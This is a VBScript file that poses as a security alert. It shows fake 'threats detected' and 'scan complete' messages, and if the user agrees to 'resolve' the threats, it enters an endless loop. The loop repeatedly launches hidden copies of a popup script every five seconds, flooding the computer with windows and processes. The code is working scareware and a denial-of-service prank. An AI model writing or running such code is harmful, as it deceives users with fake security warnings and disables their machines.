Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
path = fso.GetParentFolderName(WScript.ScriptFullName)

ans = MsgBox("Threats detected! Run Anti-Virus Scan?", 48+4, "System Security")

If ans = 6 Then
    MsgBox "Scanning... 100% Complete.", 64, "Security Scan"
    WScript.Sleep 500
    ans2 = MsgBox("1,928 Threats Found! Resolve Now?", 16+4, "CRITICAL ERROR")
    
    If ans2 = 6 Then
        ' --- THE CHAOS ENGINE ---
        Do
            ' Spawns a massive clump of 50 windows
            For i = 1 to 10
                shell.Run "wscript.exe """ & path & "\popup.vbs""", 0, False
            Next
            
            ' Wait only 5 seconds before the next massive wave
            WScript.Sleep 5000 
        Loop
    End If
End If